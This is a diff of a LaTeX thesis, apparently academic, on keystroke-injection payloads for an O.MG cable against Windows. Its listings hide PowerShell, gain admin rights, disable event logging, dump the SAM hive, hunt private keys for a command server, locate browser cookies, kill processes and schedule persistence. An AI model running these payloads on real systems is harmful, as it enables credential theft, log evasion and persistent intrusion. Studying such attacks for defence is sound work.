@@ -26,24 +26,24 @@ This section will give a short overview over those use cases and how they can be
 On Windows, there are several ways to open an application. This can be rather complicated, i.e. finding the executable in the files and running it, or simply searching it in the Windows search menu and accessing it from there. These are some of the ways in which applications can be opened;
 \begin{enumerate}
     \item Running the executable requires intel on the victim's file structure. A more feasible alternative is the Windows run menu, which can be opened with the \textit{Windows key + r}. Here the name of the application can be entered, i.e. \textit{powershell} or \textit{powershell.exe}. Additionally, it can work with parameters, for example \textit{--incognito} can be used in combination with \textit{brave.exe} to open a private tab of the Brave browser. Or another example is opening Powershell with window style hidden:
-    \begin{lstlisting}
+    \begin{lstlisting}[caption={Open powershell in a hidden window with Windows Run Menu},captionpos=b]
     STRING GUI r
     STRINGLN powershell.exe -windowstyle hidden
     \end{lstlisting}
     \item Many Windows system applications can be accessed through the Windows power menu, which is accessed with \textit{Windows key + x}. This menu can be navigated with tabs or letters; every option has one underlined letter, by pressing the corresponding key on the keyboard, that option is executed. As illustration the following implementation uses this approach to open Task Manager:
-    \begin{lstlisting}
+    \begin{lstlisting}[caption={Open powershell with Windows Power User Menu}, captionpos=b]
     STRING GUI x
     STRING t
     \end{lstlisting}
-    \item Another Windows menu can be used to open applications; the Windows run menu. Simply pressing the Windows key will open it, and autofocus the cursor to the search bar, such that the application name can be typed. It is advisable to type out the entire name of the desired application to make sure the correct version is selected (i.e. '\textit{Outlook (new)}' instead of just '\textit{Outlook}' to ensure that the new and not the old version is opened). It is also important to give the system some time to load the search results and not program the enter key immediately after starting the search.
-    \begin{lstlisting}
+    \item Another Windows menu can be used to open applications; the Windows Run Menu. Simply pressing the Windows key will open it, and autofocus the cursor to the search bar, such that the application name can be typed. It is advisable to type out the entire name of the desired application to make sure the correct version is selected (i.e. '\textit{Outlook (new)}' instead of just '\textit{Outlook}' to ensure that the new and not the old version is opened). It is also important to give the system some time to load the search results and not program the enter key immediately after starting the search.
+    \begin{lstlisting}[caption={Open Teams through Windows Run Menu}, captionpos=b]
     STRING GUI
     STRING Microsoft Teams (work or school)
     DELAY 100
     ENTER
     \end{lstlisting}
     \item Lastly, Windows has default and customizable shortcuts that can be used to open applications. Commonly known is, for example, \textit{ctrl + shift + escape} to open task manager. Application on the toolbar can similarly be opened through \textit{Windows key +} their index number. Assuming the attacker knows that the mail application is the first icon on the toolbar, they could run an payload that looks like this to open it:
-    \begin{lstlisting}
+    \begin{lstlisting}[caption={Open the first item on the toolbar}, captionpos=b]
     GUI + 1
     \end{lstlisting}
 \end{enumerate}
@@ -54,7 +54,7 @@ In general it holds, as always, that the best choice is the fastest and most rel
 
 Acquiring admin rights is mainly an issue when trying to execute admin level command in Powershell. For these operations, Powershell should be run as administrator. \\
 The most straight forward approach for this is to use the power user menu and selecting Terminal (Admin) with the 'a' shortcut. If the current user is the administrator, a simple dialogue window will pop up to ask if the application should be allowed to make changes to the device. 'Yes' can be selected and Powershell will open run with administrator access. If the current user is not the administrator, the prompt will ask for the admin password. \\
-\begin{lstlisting}
+\begin{lstlisting}[caption={Open terminal wihh admin rights via the Power User Menu}, captionpos=b]
 GUI x
 DELAY 100
 STRINGLN a
@@ -65,7 +65,7 @@ ENTER
 \end{lstlisting}
 
 Another option is to search Powershell in the search menu and navigating to the option '\textit{Run as Administrator}' \\
-\begin{lstlisting}
+\begin{lstlisting}[caption={Open Powershell with admin rights via Search Menu}, captionpos=b]
 GUI
 STRING Powershell
 DELAY 300
@@ -79,20 +79,20 @@ ENTER
 
 In Windows exists a little menu for every open window. It can be accessed by right clicking somewhere in the header of the window, or more simply having it focused and pressing the \textit{Alt} and \textit{Space} key on the keyboard simultaneously. \\
 The menu features the options '\textit{\underline{R}estore}', '\textit{\underline{M}ove}', '\textit{\underline{S}ize}', '\textit{Mi\underline{n}imize}', '\textit{Ma\underline{x}imize}', and '\textit{\underline{C}lose}'. The underlined letter in every option marks its shortcut. This can be used to minimize active windows or closing them after running a payload to cover one's tracks.
-\begin{lstlisting}
+\begin{lstlisting}[caption={Close a window through its window menu}, captionpos=b]
 ALT SPACE
 DELAY 50
 STRING c
 \end{lstlisting}
 It is important to keep in mind, that the name of these options and with that their shortcuts are dependent on the system language. \\
 Another common shortcut for closing focused windows is \textit{Alt F4}.
-\begin{lstlisting}
+\begin{lstlisting}[caption={Close a window with ALT F4}, captionpos=b]
 ALT F4
 \end{lstlisting}
 \\
 
 An option specifically for closing Powershell windows is the shell keyword '\textit{exit}' :
-\begin{lstlisting}
+\begin{lstlisting} [caption={Close Powershell with the \textit{exit} keyword}, captionpos=b]
 STRINGLN exit
 \end{lstlisting}
 
@@ -102,7 +102,7 @@ STRINGLN exit
 When gathering some information form the victim's laptop, the question arises how this information can be forwarded to the attacker. While there is a myriad for possibilities for this, ranging from physical attraction, to Bluetooth, to basic IP packets, this thesis will elaborate on two ways to send information using a connection to an internet network.
 One option to send out information is to send it to an already established server. The O.MG repository on GitHub features examples for sending intel to a Dropbox or discord server, sending via Teams, Email and more. The advantage of sending information over a frequently used communication channel like this, is that it looks very iconspicuous and will probably pass through firewalls.\\
 One example of sending an Extensible Markup Language (XML) object to a discord webhook given the webhook address and the content for the XML object:
-\begin{lstlisting}
+\begin{lstlisting}[caption=Send an XML object through Powershell}, captionpos=b]
 STRING $xmlObject = [xml]$xmlContent
 ENTER
 STRING $Payload = @{xml = $xmlObject}
@@ -127,7 +127,7 @@ Once the payload has navigated to the correct menu, it can select the email for 
 To illustrate this attack the following lines show some of the navigational steps:
 
 
-\begin{lstlisting}
+\begin{lstlisting} [caption={Example for navigation in a UI based payload: exceprt from navigating to Outlook Menu to change the email forwarding settings}, captionpos=b]
 DELAY 100
 DOWNARROW
 DELAY 100
@@ -170,7 +170,7 @@ This implementation opens the Windows Event log application through the Windows 
 This approach mimics the action of a UI focused user. As explained in Section \ref{methodology} this has some drawbacks attached to it, namely the risk of unexpected UI behaviour and irregular loading times. This payload snippet exemplifies the approach of adding long delaysin between commands to ensure all actions are executed to completion before triggering the next command.\\
 The implementation of this payload contains a lot of tabs, due to the navigational nature. This is an excerpt for illustration:
 
-\begin{lstlisting}
+\begin{lstlisting}[caption={Exceprt: disable Windows Event Logging by navigating UI}, captionpos=b]
 DELAY 1000
 TAB
 DELAY 2000
@@ -197,7 +197,7 @@ Using the Command Line for this attack does not have the same weaknesses as the 
 Once the admin problem has been navigated, the payload is straightforward and consists of entering to commands and closing the Powershell window.
 The CLI appraoch is more reliable and concise, however, it requires admin privileges for the shell. This can be achieved through the WinX menu, where the admin shell is opened directly. Then the payload consists only of a few more lines:
 
-\begin{lstlisting}
+\begin{lstlisting}[caption={Exceprt: disable Windows Event Logging through Powershell}, captionpos=b]
 STRINGLN Stop-Service -Name "eventlog"
 DELAY 200
 STRINGLN Set-Service -Name "eventlog" -StartupType Disabled
@@ -212,7 +212,7 @@ Hash's associated keys, subkeys, and values make up a hive that can be exfiltrat
 Once admin privileges on a terminal have been secured, this is a straight forward process. 
 
 
- \begin{lstlisting} 
+ \begin{lstlisting} [caption={Exceprt: extract and SSH files}, captionpos=b]
  STRINGLN reg save HKLM\SAM C:\sam.hiv
  \end{lstlisting}
 
@@ -220,7 +220,7 @@ Once admin privileges on a terminal have been secured, this is a straight forwar
 
 File extensions can be searched with the help of Powershell. For that reason, this extraction payload will run a simple loop on a predefined (default) path to a directory that is expected to contain private key files and send the discovered files to a command server. 
 
-\begin{lstlisting}
+\begin{lstlisting}[caption={Exceprt: search for private key files by their file extension}, captionpos=b]
 DUCKY_LANG DE_CH
 DELAY 50
 GUI r
@@ -241,34 +241,25 @@ STRINGLN     }
 DELAY 200
 STRINGLN     if ($extensions -contains $_.Extension) {
 DELAY 200
-            *insert code to send file to desired location*
-DELAY 200
-STRINGLN     }
-DELAY 200
-STRINGLN }
-DELAY 50
-ENTER
-DELAY 200
-STRINGLN exit
 \end{lstlisting}
 
 
 \subsubsection{Steal Web Session Cookies}
 
 A client's default browser can be extracted via Powershell using only one line:
-\begin{lstlisting}
+\begin{lstlisting}[caption={Exceprt: Find a target's default browser}, captionpos=b]
 STRINGLN Get-ItemProperty -Path 'HKCU: Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice' | Select-Object -ExpandProperty ProgId
 \end{lstlisting}
 
 After that information is sent back to the attacker, they can connect to the cable and remotely trigger the appropriate attack. For example, if the victim's default browser is Firefox, they could start a terminal, navigate to the default directory for Firefox cookies and extract that file.
 
-\begin{lstlisting}
+\begin{lstlisting}[caption={move into the directory for Firefox cookies}, captionpos=b]
 STRINGLN cd "C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\umva4gfp.default-release\cookies.sqlite"
 \end{lstlisting}
 
 The same approach can be used for chrome, the difference is in the file path.
 
-\begin{lstlisting}
+\begin{lstlisting}[caption={move into the directory for Chrome cookies}, captionpos=b]
 STRINGLN cd "C:\Users\maaik\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
 \end{lstlisting}
 
@@ -277,7 +268,7 @@ STRINGLN cd "C:\Users\maaik\AppData\Local\Google\Chrome\User Data\Default\Networ
 Finding and ending processes on Windows can be done with Powershell and without admin privileges. The payload first defines the black- or whitelist, depending on the mode of the attack, then gets a list of all running processes. Next, it will either end all running processes that are also in the whitelist, or it will end every running process that is not in the blacklist. \\
 This is an excerpt of the whitelist mode;
 
-\begin{lstlisting}
+\begin{lstlisting}[caption={Exceprt: a Powershell looop that ends a running process if it is contained in the whitelist}, captionpos=b]
 STRINGLN $criticalProcessesWhitelist = @( "firefox" , "ROCCAT_Swarm_Monitor", "Notepad" )
 DELAY 5
 STRINGLN while("true"){
@@ -313,7 +304,7 @@ Similarly, some job options can also be configured, they can be things like '-Co
 After these settings have been defined, the job itself is registered and the Powershell window can be closed. \\
 
 
-\begin{lstlisting}
+\begin{lstlisting}[caption={Excerpt: register a scheduled job via Powershell}, captionpos=b]
 DELAY 2000
 STRINGLN $trigger = New-JobTrigger -AtLogon
 DELAY 200
